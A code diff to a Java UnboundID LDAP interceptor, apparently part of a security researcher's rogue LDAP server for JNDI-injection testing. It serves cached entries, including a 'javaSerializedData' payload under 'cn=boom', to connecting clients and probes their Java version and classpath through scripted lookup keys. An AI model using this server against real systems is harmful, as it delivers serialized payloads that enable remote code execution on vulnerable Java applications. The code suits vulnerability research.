@@ -1,6 +1,9 @@
 package dev.sonatype.slyserver;
 
-import com.unboundid.ldap.listener.interceptor.*;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedAddRequest;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedAddResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
 import com.unboundid.ldap.sdk.*;
 import org.jboss.logging.Logger;
 
@@ -15,14 +18,16 @@ public class Interceptor extends InMemoryOperationInterceptor {
 
     private static final Logger log = Logger.getLogger(Interceptor.class);
 
-   // @Inject
-   // @RestClient
-   // FormInterface extensionsService;
-
-    public static Map<String, CacheEntry> cache=new HashMap<>();
+    public static Map<String, CacheEntry> cache = new HashMap<>();
 
     private String frontend;
 
+    private String byteToHex(byte num) {
+        char[] hexDigits = new char[2];
+        hexDigits[0] = Character.forDigit((num >> 4) & 0xF, 16);
+        hexDigits[1] = Character.forDigit((num & 0xF), 16);
+        return new String(hexDigits);
+    }
     /**
      * Simple sidestepping of java schema validation
      * Added objects are cached for easy access later
@@ -30,31 +35,78 @@ public class Interceptor extends InMemoryOperationInterceptor {
     @Override
     public void processAddRequest(InMemoryInterceptedAddRequest request) throws LDAPException {
 
-        log.info("intercepted added request");
-
-        ReadOnlyAddRequest roa=request.getRequest();
 
 
-       CacheEntry ce=new CacheEntry();
-        ce.dn=roa.getDN();
-        ce.attributes=roa.getAttributes();
+        ReadOnlyAddRequest roa = request.getRequest();
+        String dn=roa.getDN();
 
-        cache.put(ce.dn,ce);
+        log.infof("intercepted added request for %s",dn);
+
+         if(dn.equals("cn=boom")) {
+             if(roa instanceof AddRequest) {
+                 AddRequest ar= (AddRequest) roa;
+                 log.info("replaced payload");
+                 byte[] b=roa.toEntry().getAttribute("javaSerializedData").getValueByteArray();
+                 StringBuilder hex=new StringBuilder();
+                 StringBuilder data=new StringBuilder();
+
+                 for(byte b1:b) {
+                     char c= (char) b1;
+                     if(Character.isLetterOrDigit(c)) data.append(c+"  ");
+                     else data.append(".  ");
+                     hex.append(byteToHex(b1)+" ");
+                 }
+                 System.out.println(hex);
+                 System.out.println(data);
+
+              //   ar.replaceAttribute("javaSerializedData",new byte[]{0,0,0});
+             }
+
+           }
+
+        CacheEntry ce = new CacheEntry();
+        ce.dn = dn;
+        ce.attributes = roa.getAttributes();
+
+        cache.put(ce.dn, ce);
 
 
+    }
 
+    private void formatPrint(CacheEntry ce) {
+
+
+        System.out.println("----");
+        System.out.println("dn:"+ce.dn);
+        System.out.println("cn:"+ce.cn);
+        for(Attribute a:ce.attributes) {
+
+            System.out.println("a:basename:"+a.getBaseName());
+            System.out.println("a:name:"+a.getName());
+            System.out.println("a:options"+a.getOptions());
+            var values=a.getRawValues();
+            for(var v : values) {
+                System.out.println("a:value:"+v.stringValue());
+
+            }
+            System.out.println("---");
+        }
     }
 
 
     /**
      * Add always succeeds
+     *
      * @param result
      */
     @Override
     public void processAddResult(InMemoryInterceptedAddResult result) {
 
-        log.info("intercepted in memory added request");
+        log.infof("intercepted in memory added request %s",result.getRequest().getDN());
+
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+
+
     }
 
     /**
@@ -66,18 +118,16 @@ public class Interceptor extends InMemoryOperationInterceptor {
     @Override
     public void processSearchResult(InMemoryInterceptedSearchResult result) {
 
-        log.info("intercepted search request");
 
-        String addr=result.getConnectedAddress();
+        String addr = result.getConnectedAddress();
+        String key = result.getRequest().getBaseDN();
 
-        String key=result.getRequest().getBaseDN();
+        log.infof("intercepted search request from %s, key [%s]", addr, key);
 
-        log.infof("search request from %s, key [%s]",addr,key);
+        CacheEntry ce = handleRequest(key, addr);
 
-        CacheEntry ce=handleRequest(key,addr);
-
-        Entry e=new Entry(ce.dn);
-        for(Attribute a:ce.attributes) {
+        Entry e = new Entry(ce.dn);
+        for (Attribute a : ce.attributes) {
             e.addAttribute(a);
         }
 
@@ -94,16 +144,16 @@ public class Interceptor extends InMemoryOperationInterceptor {
     }
 
 
-    public  CacheEntry handleRequest(String key,String addr) {
+    public CacheEntry handleRequest(String key, String addr) {
 
 
-    log.infof("handle request %s",key);
+        log.infof("handle request %s", key);
 
-        if(cache.containsKey(key)) {
+        if (cache.containsKey(key)) {
             return cache.get(key);
         }
 
-        if(key.equals("a")) {
+        if (key.equals("a")) {
             // starting conversation ..
             // request java version
 
@@ -111,23 +161,23 @@ public class Interceptor extends InMemoryOperationInterceptor {
 
         }
 
-        if(key.startsWith("echo/")) {
+        if (key.startsWith("echo/")) {
 
-            String data=key.substring(5);
-            log.infof("echo requested %s / %s",data,key);
-            LdapServerUploader.upload("cn=echo",addr+" sent us this "+data);
+            String data = key.substring(5);
+            log.infof("echo requested %s / %s", data, key);
+            LdapServerUploader.upload("cn=echo", addr + " sent us this " + data);
             return cache.get("cn=echo");
         }
 
 
-        if(key.startsWith("version/")) {
+        if (key.startsWith("version/")) {
             System.out.println(key);
             System.out.println("ask for classpath");
             return cache.get("cn=getclasspath");
 
         }
 
-        if(key.startsWith("classpath/")) {
+        if (key.startsWith("classpath/")) {
             System.out.println(key);
             return cache.get("cn=saythankyou");
 
@@ -136,8 +186,6 @@ public class Interceptor extends InMemoryOperationInterceptor {
         return cache.get("cn=404");
 
     }
-
-
 
 
     public static class CacheEntry {
